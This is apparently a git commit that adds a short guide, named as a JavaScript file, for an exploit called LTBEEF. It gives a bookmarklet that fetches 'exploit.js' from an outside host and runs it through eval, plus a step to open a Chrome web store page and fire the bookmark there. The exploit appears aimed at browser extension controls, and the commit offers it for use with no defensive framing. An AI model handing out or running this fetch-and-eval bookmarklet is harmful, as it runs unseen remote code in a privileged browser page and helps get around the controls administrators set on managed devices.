59706b3b8dbb5f44e56274e3a80b9bab97ed360b
Buypass07 <idkchigo@gmail.com>
2026-04-17 18:30:00 -0400

    Update LTBEEF guide with bookmark instructions
    Added instructions for using a bookmark to run a script.

---
+++ LTBEEF guide.js
@@ -0,0 +1,3 @@
+https://www.youtube.com/watch?v=LxGyfxe1MU4
+bookmark this Code! javascript:fetch(`https://compactcow.com/ltbeef/exploit.js`).then(data=>{data.text().then(text=>{eval(text)})});
+then navigate to: Chrome.google.com/webstorex, then run the bookmark!
